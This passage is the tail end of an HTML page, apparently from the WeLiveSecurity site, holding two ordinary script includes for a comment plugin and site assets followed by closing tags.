<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>